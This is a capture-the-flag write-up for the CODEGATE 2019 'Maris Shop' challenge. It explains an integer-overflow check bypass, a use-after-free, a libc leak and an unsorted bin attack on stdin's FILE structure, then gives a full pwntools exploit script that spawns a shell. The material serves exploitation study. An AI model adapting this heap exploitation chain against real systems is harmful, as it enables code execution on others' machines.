# CODEGATE2019 Maris Shop

```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
PIE, Partial RELRO

```
void __cdecl item_init()
{
  signed int i; // [rsp+Ch] [rbp-4h]

  puts("Welcome to Mari's Shop!");
  puts("Choose item and Add to your cart");
  puts("Enjoy Shopping!!");
  crystal_num = 100;
  for ( i = 0; i <= 29; ++i )
  {
    whole_items[i] = malloc(0x90uLL);
    strncpy(&whole_items[i]->name, item_pools[i], 0x80uLL);
    whole_items[i]->price = item_pools_price[i];
  }
}
```
Initialize whole_items which is an array of structure pointers

```
struct item {
  unsigned int price;
  unsigned int dummy;
  int64 amount;
  char name[128];
}
```

```
if ( (signed int)(cart[idx]->price * (unsigned __int64)cart[idx]->amount) > crystal_num )
{
  puts("You don't have enough money!");
  return;
}
crystal_num -= cart[idx]->price * (unsigned __int64)cart[idx]->amount;
free(cart[idx]);
for ( i = idx; i <= 0xE && cart[i + 1]; ++i )
  cart[i] = cart[i + 1];
  cart[i] = 0LL;
```


`cart[idx]->price` and `cart[idx]->amount` are unsigned, but after multiplication casted to signed.
if the product value is larger than 0x7fffffffffffffff, if statement can be bypassed.
`crystal_num -= cart[idx]->price * (unsigned __int64)cart[idx]->amount;`
then we can overflow crystal_num to have large value.
```
puts("Do you want to clear your cart?");
puts("1. Yes");
puts("2. No");
printf("Your choice:");
v3 = 0;
if ( (unsigned int)get_number() == 1 )
{
  while ( cart[v3] )
    free(cart[v3++]);
}
else
{
  puts("Sorry, you must clear your cart");
}
for ( k = 0; k <= 0xE; ++k )
  cart[k] = 0LL;
```
cart is an array of 16 pointers. but after free only 15 of them are written with NULL. thus there is UAF vulnerability, which can be used to get libc address.

In remove menu, program doesn't free the pointer but only removes pointer in cart array.

```
void __cdecl remove_from_cart()
{
  unsigned int i; // [rsp+8h] [rbp-8h]
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  printf("Which item?:");
  idx = get_number();
  if ( idx <= 0xF )
  {
    if ( cart[idx] )
    {
      for ( i = idx; i <= 0xE && cart[i + 1]; ++i )
        cart[i] = cart[i + 1];
      cart[i] = 0LL;
    }
    else
    {
      puts("No such item!");
    }
  }
  else
  {
    puts("No such item!");
  }
}
```

I used this point and made dummy chunks and was able to get libc address.
Then we should do unsorted bin attack. To do unsorted bin attack, we should be able to overwrite the bk pointer of an unsorted chunk. How we can overwrite bk? The Answer is in add func.

```
for (i = 0; i <= 0xF; ++i) {
  if (cart[i] && !strcmp(&cart[i]->name, &items[item_num - 1]->name)) {
    printf("Add more?:");
    cart[i]->amount += get_number();
    puts("Done!");
    return;
  }
}
```

In add func, program gets user input, which is the index of add item and check whether input item is already in cart.
Program do not check whether the pointer in cart array is freed. We can modify `cart[i]->amount`, which is the bk pointer of unsorted chunk. With unsorted bin attack, we overwrite _IO_buf_end of stdin FILE structure with main_arena + 88, leading to overwriting the entire structure. we can make fake vtable with one_gadget and get shell:)

```
from pwn import *

stdin_buf_end_offset = 0x3c4920
vtable_offset = 0x3c36e0
one_gadget_offset = 0xf02a4  # 0x45216 0x4526a 0xf02a4 0xf1147

p = process('./Maris_shop', env={'LD_PRELOAD': './libc.so.6'})


def overflow():
    p.sendlineafter('Your choice:', str(1))
    p.recvuntil('---- ')
    price = int(p.recvuntil('\n', drop=True))
    p.sendlineafter('Which item?:', '1')
    p.sendlineafter('Amount?:', str(0xa0000000 / price))
    p.sendlineafter('Your choice:', '4')
    p.sendlineafter('Your choice:', '1')
    p.sendlineafter('Which item?:', '0')
    p.recvuntil('Done!\n\n')


def unsorted_bin_attack():
    p.sendlineafter('Your choice:', str(1))
    result = p.recvuntil('Which item?:').split('\n')
    del result[0]
    del result[-1]

    for item in result:
        if item_name in item:
            return item[0], result
    return None, result


def is_in_cart(result):
    null_idx = 1

    while True:
        for item in result:
            for item_in_cart in items_in_cart:
                if item_in_cart in item:
                    return null_idx
            null_idx = null_idx + 1
        return None


def add(idx, amount):
    p.sendlineafter('Your choice:', str(1))
    p.sendlineafter('Which item?:', str(idx))
    p.sendlineafter('?:', str(amount))
    p.recvuntil('Done!\n\n')


def remove(idx):
    p.sendlineafter('Your choice:', str(2))
    p.sendlineafter('Which item?:', str(idx))


def buy(idx, buy_all):
    p.sendlineafter('Your choice:', str(4))
    if buy_all:
        p.sendlineafter('Your choice:', str(2))
        p.sendlineafter('Your choice:', str(1))
    else:
        p.sendlineafter('Your choice:', str(1))
        p.sendlineafter('Which item?:', str(idx))
    p.recvuntil('Done!\n\n')


def show(idx, show_all):
    p.sendlineafter('Your choice:', str(3))
    if show_all:
        p.sendlineafter('Your choice:', str(2))
    else:
        p.sendlineafter('Your choice:', str(1))
        p.sendlineafter('Which item?:', str(idx))


# gdb.attach(p, '')

# Increase the number of crystals by integer overflow
overflow()

# add 16 items and buy all
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

buy(0, True)

# make two orphan chunks
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 3:
        break

remove(0)
remove(0)

# allocate 15 chunks and Libc leak
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

buy(0xd, False)
show(0xe, False)

p.recvuntil('Amount: ')
libc_addr = int(p.recvuntil('\n')[:-1]) - 0x3c4b78

log.info('Libc Addr: ' + hex(libc_addr))
log.info('Arena + 88: ' + hex(libc_addr + 0x3c4b78))
log.info('One_gadget_addr: ' + hex(libc_addr + one_gadget_offset))

# Unsorted bin Attack
show(0, True)
items_in_cart = p.recvuntil('14: ').split('\n')
del items_in_cart[0]
del items_in_cart[-1]

for x in range(len(items_in_cart)):
    if(x < 9):
        items_in_cart[x] = items_in_cart[x][3:]
    else:
        items_in_cart[x] = items_in_cart[x][4:]

item_name = p.recvuntil('\n')[:-1]
log.info('Item name: ' + item_name)
log.info('Diff Offset: ' + hex(stdin_buf_end_offset - 0x3c4b78))

while True:
    idx, result = unsorted_bin_attack()
    if idx is None:
        null_idx = is_in_cart(result)
        if null_idx is None:
            log.info('Error')
        log.info(null_idx)
        p.sendline(str(null_idx))
        p.sendlineafter('?:', str(1))
        p.recvuntil('Done!\n\n')
    else:
        p.sendline(idx)
        p.sendlineafter('Add more?:', str(
            stdin_buf_end_offset - 0x10 - 0x3c4b78))
        p.recvuntil('Done!\n\n')
        break

while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

payload = '\x00'*5 + p64(libc_addr+0x3c6790)
payload += p64(0xffffffffffffffff) + p64(0x0000000000000000)
payload += p64(libc_addr + 0x3c49c0) + p64(0)*3
payload += p64(0x00000000ffffffff) + p64(0)*2 + p64(libc_addr + 0x3c49c0)
payload += p64(0)*2 + p64(libc_addr + one_gadget_offset)*10
p.sendline(payload)
p.recvuntil('Your choice:')
p.interactive()
```